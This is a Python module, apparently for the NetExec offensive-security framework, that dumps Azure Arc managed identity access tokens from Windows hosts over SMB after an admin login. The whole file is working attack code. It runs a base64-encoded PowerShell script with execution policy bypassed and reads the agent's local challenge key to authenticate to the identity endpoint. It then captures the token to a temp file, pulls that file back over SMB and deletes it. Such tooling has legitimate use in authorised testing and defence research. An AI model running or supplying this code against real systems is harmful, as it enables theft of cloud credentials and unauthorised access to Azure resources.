import base64
from nxc.helpers.misc import CATEGORY


class NXCModule:
    r"""
    Azure Arc local managed identity token discovery/dump over SMB.

    - CHECK: Only verify whether Azure Arc agent is installed (default: False)
    - RESOURCE: Override the AAD resource audience (default: https://management.azure.com)
    - API_VERSION: Override the Arc IMDS API version (default: 2021-02-01)
    - VERBOSE: Emit detailed diagnostics (true/false)
    - OUTFILE: Path to capture output on target (default: C:\\Windows\\Temp\\azurearc_out.txt)

    Usage examples:
      nxc smb <target> -u <user> -p <pass> -M azurearc -o CHECK=true
      nxc smb <target> -u <user> -p <pass> -M azurearc
    """

    name = "azurearc"
    description = "Check/dump Azure Arc Managed Identity access token via local agent"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self):
        self.check_only = False
        self.resource = "https://management.azure.com"
        self.api_version = "2021-02-01"
        self.verbose = False
        self.outfile = r"C:\\Windows\\Temp\\azurearc_out.txt"

    def options(self, context, module_options):
        """
        CHECK       If true, only check if Azure Arc agent is present (default: false)
        RESOURCE    AAD resource audience to request (default: https://management.azure.com)
        API_VERSION Arc identity endpoint API version (default: 2021-02-01)
        """
        self.check_only = False
        self.resource = "https://management.azure.com"
        self.api_version = "2021-02-01"
        self.verbose = False
        self.outfile = r"C:\\Windows\\Temp\\azurearc_out.txt"
        if module_options:
            # Accept various casings/values: CHECK, check, true/false
            for k, v in module_options.items():
                if k.lower() == "check":
                    self.check_only = str(v).lower() in ["1", "true", "yes"]
                elif k.lower() == "resource":
                    self.resource = str(v)
                elif k.lower() == "api_version":
                    self.api_version = str(v)
                elif k.lower() == "verbose":
                    self.verbose = str(v).lower() in ["1", "true", "yes"]
                elif k.lower() == "outfile":
                    self.outfile = str(v)

    def on_admin_login(self, context, connection):
        # Ensure we only run once per connection
        if not hasattr(connection, "__azurearc_done__"):
            connection.__azurearc_done__ = False
        if connection.__azurearc_done__:
            return
        connection.__azurearc_done__ = True

        try:
            has_arc = self._check_arc_presence(context, connection)
            if self.check_only:
                if has_arc:
                    context.log.success("Azure Arc agent appears to be installed")
                else:
                    context.log.fail("Azure Arc agent not found")
                return

            if not has_arc:
                context.log.fail("Azure Arc agent not found - cannot request token")
                return

            self._dump_token(context, connection)
        except Exception as e:
            context.log.fail(f"AzureArc module error: {e}")

    def _check_arc_presence(self, context, connection) -> bool:
        # Try standard 64-bit Program Files first
        arc_paths = [
            ("C$", "\\Program Files\\AzureConnectedMachineAgent\\*"),
            ("C$", "\\Program Files (x86)\\AzureConnectedMachineAgent\\*"),
        ]
        for share, path in arc_paths:
            try:
                connection.conn.listPath(share, path)
                context.log.debug(f"Azure Arc path exists: {share}\\{path}")
                return True
            except Exception as e:
                context.log.debug(f"Azure Arc path check failed for {share}\\{path}: {e}")
                continue
        return False

    def _dump_token(self, context, connection):
        # Robust PS script: fixed endpoint, always write to OUTFILE, emit diagnostics if VERBOSE
        fixed_endpoint = "http://localhost:40342/metadata/identity/oauth2/token"
        ps = "\n".join([
            "$ErrorActionPreference = 'Stop'",
            ("$VerbosePreference = 'Continue'" if self.verbose else "$VerbosePreference = 'SilentlyContinue'"),
            f"$o = '{self.outfile}'",
            "try { $null = New-Item -ItemType Directory -Path (Split-Path -LiteralPath $o) -Force } catch {}",
            "function Write-Log([string]$s) { Add-Content -LiteralPath $o -Value $s -Encoding UTF8 }",
            "Remove-Item -ErrorAction SilentlyContinue -LiteralPath $o",
            "Write-Log 'DBG:BEGIN'",
            f"$resource = '{self.resource}'",
            f"$apiVersion = '{self.api_version}'",
            f"$uri = '{fixed_endpoint}?resource=' + [System.Uri]::EscapeDataString($resource) + '&api-version=' + $apiVersion",
            "$resp1 = $null; $www = ''",
            "try { Invoke-WebRequest -Method GET -Headers @{ Metadata = 'True' } -UseBasicParsing -Uri $uri -Verbose:$false | Out-Null; Write-Log 'DBG:REQ1_UNEXPECTED_200' }",
            "catch { if ($_.Exception.Response) { $resp1 = $_.Exception.Response; $code = $resp1.StatusCode.value__; $www = $resp1.Headers['WWW-Authenticate']; Write-Log (\"DBG:REQ1_STATUS=\" + $code); Write-Log (\"DBG:REQ1_WWW=\" + $www) } else { Write-Log (\"ERR:REQ1_NO_RESPONSE: \" + $_.Exception.Message); return } }",
            "$path = ($www -split 'Basic realm=')[1].Trim()",
            "if ($path.StartsWith('\"') -and $path.EndsWith('\"')) { $path = $path.Substring(1, $path.Length-2) }",
            'Write-Log ("DBG:KEY_PATH=" + $path)',
            'if (-not (Test-Path -LiteralPath $path)) { Write-Log ("ERR:KEY_NOT_FOUND: " + $path); return }',
            "$basic = Get-Content -LiteralPath $path -Raw",
            'Write-Log ("DBG:KEY_LEN=" + ($basic.Length))',
            "try { $r2 = Invoke-WebRequest -Method GET -Headers @{ Metadata = 'True'; Authorization = (\"Basic \" + $basic) } -UseBasicParsing -Uri $uri -Verbose:$false; Write-Log (\"DBG:REQ2_STATUS=\" + $r2.StatusCode); $content = $r2.Content; if (-not $content) { Write-Log 'ERR:NO_CONTENT'; return } ; Add-Content -LiteralPath $o -Value $content -Encoding UTF8 }",
            "catch { if ($_.Exception.Response) { $r2 = $_.Exception.Response; $status = $r2.StatusCode.value__; $body = try { $reader = New-Object System.IO.StreamReader($r2.GetResponseStream()); $reader.ReadToEnd() } catch { '' }; Write-Log (\"ERR:REQ2_FAILED_STATUS=\" + $status); if ($body) { Write-Log (\"ERR:REQ2_BODY=\" + $body) } } else { Write-Log (\"ERR:REQ2_EXCEPTION=\" + $_.Exception.Message) } }",
        ])
        if self.verbose:
            context.log.info(f"Endpoint: {fixed_endpoint} | Resource: {self.resource} | API: {self.api_version}")
        context.log.display("Attempting to retrieve Azure Arc Managed Identity access token")
        try:
            # Execute via EncodedCommand for reliable quoting/stdout behavior
            ps_bytes = ps.encode("utf-16le")
            ps_b64 = base64.b64encode(ps_bytes).decode()
            command = f"powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {ps_b64}"
            _ = connection.execute(command, True)
            # Read OUTFILE back via SMB; fallback to exec 'type' if needed
            file_out = self._read_outfile_via_smb(connection, context)
            if file_out is None:
                read_cmd = f'cmd.exe /Q /C type "{self.outfile}" && del /F /Q "{self.outfile}"'
                file_out = connection.execute(read_cmd, True)
            output = (file_out or "").strip()
        except Exception as e:
            context.log.fail(f"Failed to run PowerShell token retrieval: {e}")
            return

        if not output:
            context.log.fail("No output received from token retrieval")
            return

        # Heuristic: if looks like JSON with access_token field, highlight; else log as info
        if "access_token" in output:
            context.log.success("Managed Identity token retrieved")
            context.log.highlight(output.strip())
        else:
            # Show diagnostics or any output captured
            context.log.display(output.strip())

    def _read_outfile_via_smb(self, connection, context):
        """Try to read the OUTFILE using SMB shares directly and then delete it."""
        try:
            path = self.outfile
            if len(path) < 3 or path[1] != ":" or path[2] != "\\":
                context.log.debug(f"OUTFILE path does not look like absolute Windows path: {path}")
                return None
            share = path[0].upper() + "$"
            rel = path[3:].replace("/", "\\")
            if not rel.startswith("\\"):
                rel = "\\" + rel
            chunks = []

            def _cb(data):
                chunks.append(data)
            connection.conn.getFile(share, rel, _cb)
            content = b"".join(chunks).decode("utf-8", errors="replace")
            try:
                connection.conn.deleteFile(share, rel)
            except Exception as de:
                context.log.debug(f"Failed to delete OUTFILE via SMB: {de}")
            return content
        except Exception as e:
            context.log.debug(f"Failed to read OUTFILE via SMB: {e}")
            return None
